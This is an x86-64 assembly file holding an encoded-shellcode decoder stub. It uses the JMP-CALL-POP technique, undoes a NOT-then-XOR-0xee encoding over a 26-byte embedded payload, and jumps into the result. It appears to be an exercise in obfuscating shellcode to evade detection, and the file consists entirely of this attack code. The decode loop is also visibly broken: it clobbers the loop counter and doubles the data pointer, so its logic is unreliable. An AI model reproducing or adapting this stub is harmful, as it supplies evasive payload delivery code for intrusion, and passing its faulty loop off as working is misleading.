global _start
section .text
_start:


jmp short call_shellcode


decoder:
        pop rdi
        xor rcx, rcx
        xor rdx, rdx
        xor rax, rax
        mov cl, 26

decode:
        not byte [rdi]       ; not function is appplied
	    xor byte [rdi], 0xee ; xor function with 0xee
        mov rax, rdi         ; multiplication is done
        mov ecx, 0x2
        mul ecx
        mov rdi, rax 
        inc rdi
        loop decode          ; loop continues until the shellcode size is completed

        jmp short shellcode_to_decode ; Pointed to the decoded shellcode

call_shellcode:
        call decoder
        shellcode_to_decode: db 0x35,0x09,0x6a,0x35,0x6a,0x62,0x22,0x39,0x35,0x4c,0x06,0x20,0x25,0x26,0x06,0x06,0x28,0x25,0x38,0x3b,0x3e,0x24,0x0c,0x3d,0x16,0x13
